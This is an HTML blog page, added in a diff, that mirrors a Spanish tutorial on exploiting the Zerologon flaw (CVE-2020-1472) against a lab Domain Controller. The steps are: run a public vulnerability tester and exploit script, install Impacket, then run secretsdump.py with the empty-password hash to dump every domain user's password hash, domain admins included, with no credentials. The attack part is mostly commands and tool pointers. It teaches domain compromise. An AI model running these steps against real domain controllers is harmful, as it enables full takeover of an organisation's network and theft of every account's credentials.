@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cómo explotar la vulnerabilidad Zerologon // gh0stnet</title>
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #080808; --bg2: #0d0d0d; --border: #1a1a1a;
+      --cyan: #00fff0; --cyan-dim: rgba(0,255,240,0.15);
+      --text: #c8c8c8; --text-dim: #555; --red: #ff2e2e; --white: #e8e8e8;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: var(--bg); color: var(--text); font-family: 'Share Tech Mono', monospace;
+      font-size: 13px; line-height: 1.7; min-height: 100vh; cursor: crosshair; }
+    body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.08) 2px, rgba(0,0,0,0.08) 4px);
+      pointer-events: none; z-index: 9999; }
+    body::after { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; opacity: 0.025;
+      background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E");
+      pointer-events: none; z-index: 9998; }
+    .container { max-width: 860px; margin: 0 auto; padding: 0 24px; }
+    header { border-bottom: 1px solid var(--border); padding: 20px 0; position: sticky; top: 0;
+      background: rgba(8,8,8,0.95); backdrop-filter: blur(8px); z-index: 100; }
+    header .container { display: flex; align-items: center; justify-content: space-between; }
+    .logo { font-family: 'VT323', monospace; font-size: 28px; color: var(--cyan);
+      text-shadow: 0 0 20px var(--cyan), 0 0 40px rgba(0,255,240,0.3); text-decoration: none; letter-spacing: 2px; }
+    .logo span { color: var(--text-dim); }
+    nav { display: flex; gap: 24px; }
+    nav a { color: var(--text-dim); text-decoration: none; font-size: 12px; letter-spacing: 1px;
+      transition: color 0.2s; text-transform: uppercase; }
+    nav a:hover, nav a.active { color: var(--cyan); }
+    .status-bar { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 6px 0;
+      font-size: 11px; color: var(--text-dim); overflow: hidden; }
+    .status-bar .container { display: flex; gap: 32px; align-items: center; }
+    .status-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--cyan);
+      display: inline-block; margin-right: 6px; animation: pulse 2s infinite; }
+    @keyframes pulse { 0%, 100% { opacity: 1; box-shadow: 0 0 4px var(--cyan); } 50% { opacity: 0.4; box-shadow: none; } }
+
+    /* POST PAGE */
+    .post-head { padding: 56px 0 28px; border-bottom: 1px solid var(--border); }
+    .post-meta { font-size: 11px; color: var(--cyan); letter-spacing: 3px; text-transform: uppercase; margin-bottom: 16px; }
+    .post-meta .sep { color: var(--text-dim); margin: 0 8px; }
+    .post-head h1 { font-family: 'VT323', monospace; font-size: 48px; color: var(--white); line-height: 1.05; font-weight: normal; }
+    .credit { background: var(--bg2); border: 1px solid var(--border); border-left: 2px solid var(--cyan);
+      margin: 28px 0 8px; padding: 12px 16px; font-size: 11px; color: var(--text-dim); letter-spacing: 1px; }
+    .credit a { color: var(--cyan); text-decoration: none; }
+    .credit a:hover { text-shadow: 0 0 10px var(--cyan); }
+    article { padding: 32px 0 20px; }
+    article h1, article h2, article h3, article h4 { font-family: 'VT323', monospace; color: var(--cyan);
+      font-weight: normal; line-height: 1.1; margin: 36px 0 14px; }
+    article h1 { font-size: 36px; } article h2 { font-size: 30px; } article h3 { font-size: 25px; } article h4 { font-size: 21px; }
+    article p, article ul, article ol, article table, article pre, article blockquote { margin-bottom: 18px; }
+    article ul, article ol { padding-left: 24px; }
+    article a { color: var(--cyan); text-decoration: none; border-bottom: 1px solid var(--cyan-dim); }
+    article a:hover { border-bottom-color: var(--cyan); }
+    article strong { color: var(--white); }
+    article code { color: var(--cyan); background: var(--bg2); padding: 1px 5px; font-family: 'Share Tech Mono', monospace; }
+    article pre { background: var(--bg2); border: 1px solid var(--border); border-top: 2px solid var(--cyan);
+      padding: 16px 20px; overflow-x: auto; font-size: 12px; line-height: 1.8; }
+    article pre code { background: none; padding: 0; color: var(--text); }
+    article img, article video { max-width: 100%; height: auto; border: 1px solid var(--border); display: block; margin: 18px 0; }
+    article blockquote { border-left: 2px solid var(--text-dim); padding-left: 16px; color: var(--text-dim); }
+    article table { border-collapse: collapse; display: block; overflow-x: auto; }
+    article td, article th { border: 1px solid var(--border); padding: 6px 12px; }
+    article th { color: var(--cyan); text-align: left; }
+    article hr { border: 0; border-top: 1px solid var(--border); margin: 32px 0; }
+    .back { display: inline-block; margin: 8px 0 40px; font-size: 11px; letter-spacing: 2px; text-transform: uppercase;
+      color: var(--text-dim); text-decoration: none; }
+    .back:hover { color: var(--cyan); }
+
+    footer { border-top: 1px solid var(--border); padding: 32px 0; margin-top: 40px; }
+    footer .container { display: flex; justify-content: space-between; align-items: center; }
+    .footer-left, .footer-right { font-size: 11px; color: var(--text-dim); }
+    .footer-right span { color: var(--cyan); }
+    .logo:hover { animation: glitch 0.3s infinite; }
+    @keyframes glitch {
+      0% { text-shadow: 0 0 20px var(--cyan), 2px 0 var(--red), -2px 0 var(--cyan); }
+      25% { text-shadow: 0 0 20px var(--cyan), -2px 0 var(--red), 2px 0 var(--cyan); }
+      50% { text-shadow: 0 0 20px var(--cyan), 2px 2px var(--red), -2px -2px var(--cyan); }
+      75% { text-shadow: 0 0 20px var(--cyan), -2px 2px var(--red), 2px -2px var(--cyan); }
+      100% { text-shadow: 0 0 20px var(--cyan), 0 0 var(--red), 0 0 var(--cyan); }
+    }
+    @media (max-width: 600px) {
+      .post-head h1 { font-size: 36px; } nav { gap: 16px; }
+      footer .container { flex-direction: column; gap: 8px; text-align: center; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="container">
+      <a href="/" class="logo">gh<span>0</span>stnet<span>_</span></a>
+      <nav>
+        <a href="/" class="active">feed</a>
+        <a href="/about">about</a>
+        <a href="/ops">ops</a>
+        <a href="/bugbounty">disclosures</a>
+      </nav>
+    </div>
+  </header>
+  <div class="status-bar">
+    <div class="container">
+      <span><span class="status-dot"></span>systems nominal</span>
+      <span>// gh0stnet0.github.io</span>
+    </div>
+  </div>
+  <main>
+    <div class="container">
+      <section class="post-head">
+        <div class="post-meta">2020.09.16<span class="sep">//</span>research</div>
+        <h1>Cómo explotar la vulnerabilidad Zerologon</h1>
+        <div class="credit">// archive mirror &mdash; originally published by <a href="https://s4vitar.github.io">S4vitar</a> on 2020-09-16. reposted with the author's permission.</div>
+      </section>
+      <article>
+<p><img src="/posts/img/zerologon/zerologon.png" /></p>
+<h2 id="es-realmente-crítico-zerologon">¿Es realmente crítico Zerologon?</h2>
+<p>La respuesta es un <strong>si</strong> rotundo. No creo que haga falta a estas alturas comentar qué es Zerologon... ya existen montón de artículos a disposición detallando de forma técnica y ejecutiva en qué consiste la vulnerabilidad.</p>
+<p>Centrémonos en la explotación, ¿cómo se explota zerologon?, vamos a ello. En mi caso comenzaré haciendo uso de la siguiente utilidad:</p>
+<ul>
+<li><a href="https://github.com/SecuraBV/CVE-2020-1472"><span>https://github.com/SecuraBV/CVE-2020-1472</span></a></li>
+</ul>
+<p>Este recurso, nos permitirá a través del script <code>zerologon_tester.py</code>, saber si el DC en cuestión es vulnerable ante el ataque. Yo ya dispongo de un DC virtualizado contra el que lanzar el tester, en caso de no contar con uno, te recomiendo hacer uso de la utilidad '<strong>AD-AutomationLab</strong>', una herramienta en PowerShell que desarrollé para el despliegue automatizado de un Domain Controller entre otras cosas (también es capaz de configurar vulnerabilidades reconocidas sobre el servidor).</p>
+<p>Por aquí os dejo el enlace para aquellos/as que lo quieran usar:</p>
+<ul>
+<li><a href="https://github.com/s4vitar/AD-AutomationLab"><span>https://github.com/s4vitar/AD-AutomationLab</span></a></li>
+</ul>
+<h2 id="cómo-se-explota-la-vulnerabilidad-zerologon">¿Cómo se explota la vulnerabilidad Zerologon?</h2>
+<p>Una vez tengamos ya el Domain Controller operando, podremos empezar. La dirección IP de mi DC en este caso es la <code>192.168.101.130</code>, y la dirección IP de mi equipo atacante la <code>192.168.101.128</code>.</p>
+<p>Partiendo de este punto, estos son los resultados obtenidos al lanzar el tester sobre el DC:</p>
+<p align="center">
+<img src="/posts/img/zerologon/1.png">
+</p>
+
+<p>Toda la información referente al nombre de equipo, dominio y demás puede obtenerse rápidamente desde CrackMapExec con un simple escaneo por Samba:</p>
+<p align="center">
+<img src="/posts/img/zerologon/2.png">
+</p>
+
+<p>En base a los resultados de la primera foto, vemos que el DC es vulnerable. Lo único que nos queda por tanto es explotar la vulnerabilidad.</p>
+<p>En esta ocasión, estaré usando el siguiente recurso de la plataforma de GitHub:</p>
+<ul>
+<li><a href="https://github.com/dirkjanm/CVE-2020-1472"><span>https://github.com/dirkjanm/CVE-2020-1472</span></a></li>
+</ul>
+<p>Esta utilidad cuenta con un script de nombre <code>cve-2020-1472-exploit.py</code>, el cual como información nos solicita el nombre del equipo y la dirección IP de la máquina víctima.</p>
+<p>Antes de explotar la vulnerabilidad, para evitar problemas con Impacket, recomiendo tirar de <code>virtualenv</code> para tras su instalación ejecutar posteriormente la herramienta. Sería seguir básicamente los siguientes pasos:</p>
+<pre class="bash"><code>┌─[root@parrot]─[/home/s4vitar/Desktop]
+└──╼ #virtualenv zerologon
+created virtual environment CPython3.8.2.final.0-64 in 178ms
+  creator CPython3Posix(dest=/home/s4vitar/Desktop/zerologon, clear=False, global=False)
+  seeder FromAppData(download=False, CacheControl=latest, appdirs=latest, certifi=latest, chardet=latest, colorama=latest, contextlib2=latest, distlib=latest, distro=latest, html5lib=latest, idna=latest, ipaddr=latest, lockfile=latest, msgpack=latest, packaging=latest, pep517=latest, pip=latest, pkg_resources=latest, progress=latest, pyparsing=latest, pytoml=latest, requests=latest, retrying=latest, setuptools=latest, six=latest, urllib3=latest, webencodings=latest, wheel=latest, via=copy, app_data_dir=/root/.local/share/virtualenv/seed-app-data/v1.0.1.debian)
+  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator,XonshActivator
+┌─[root@parrot]─[/home/s4vitar/Desktop]
+└──╼ #source zerologon/bin/activate
+(zerologon) ┌─[root@parrot]─[/home/s4vitar/Desktop]
+└──╼ #cd /opt/
+(zerologon) ┌─[root@parrot]─[/opt]
+└──╼ #git clone https://github.com/SecureAuthCorp/impacket
+Clonando en &#39;impacket&#39;...
+remote: Enumerating objects: 39, done.
+remote: Counting objects: 100% (39/39), done.
+remote: Compressing objects: 100% (26/26), done.
+remote: Total 18517 (delta 19), reused 26 (delta 13), pack-reused 18478
+Recibiendo objetos: 100% (18517/18517), 6.17 MiB | 5.96 MiB/s, listo.
+Resolviendo deltas: 100% (14103/14103), listo.
+(zerologon) ┌─[root@parrot]─[/opt]
+└──╼ #cd impacket/
+(zerologon) ┌─[root@parrot]─[/opt/impacket]
+└──╼ #python3 setup.py install
+
+...
+</code></pre>
+<p>Una vez hecho, la ejecución del exploit debe devolver un output como este en caso de éxito:</p>
+<p align="center">
+<img src="/posts/img/zerologon/3.png">
+</p>
+
+<p>Si esto es así, ya todo lo demás está hecho. Lo único que tendríamos que hacer, tal y como nos indica el README del siguiente recurso:</p>
+<ul>
+<li><a href="https://github.com/risksense/zerologon"><span>https://github.com/risksense/zerologon</span></a></li>
+</ul>
+<p>Sería ejecutar la siguiente sentencia:</p>
+<pre class="bash"><code>secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 &#39;DOMAIN/DC_NETBIOS_NAME$@dc_ip_addr&#39;</code></pre>
+<p>Para mi caso quedaría de la siguiente forma:</p>
+<pre class="bash"><code>secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 &#39;s4vicorp/DC-Company$@192.168.101.130&#39;</code></pre>
+<p>Obteniendo los siguientes resultados tras su ejecución:</p>
+<p align="center">
+<img src="/posts/img/zerologon/4.png">
+</p>
+
+<p>Conseguimos listar los hashes de todos los usuarios existentes a nivel de dominio, incluido aquellos que sean administradores del dominio. Básicamente el mismo efecto que obtendríamos si desde CrackMapExec hubiéramos hecho uso de la acción <code>--ntds vss</code>, pero claro... en ese caso habríamos necesitado credenciales válidas, lo bueno del Zerologon es que no hace falta nada de eso :)</p>
+
+      </article>
+      <a href="/" class="back">&larr; back to feed</a>
+    </div>
+  </main>
+  <footer>
+    <div class="container">
+      <div class="footer-left">gh0stnet // gh0stnet0.github.io</div>
+      <div class="footer-right"><span>silence</span> is not absence. silence is control.</div>
+    </div>
+  </footer>
+</body>
+</html>
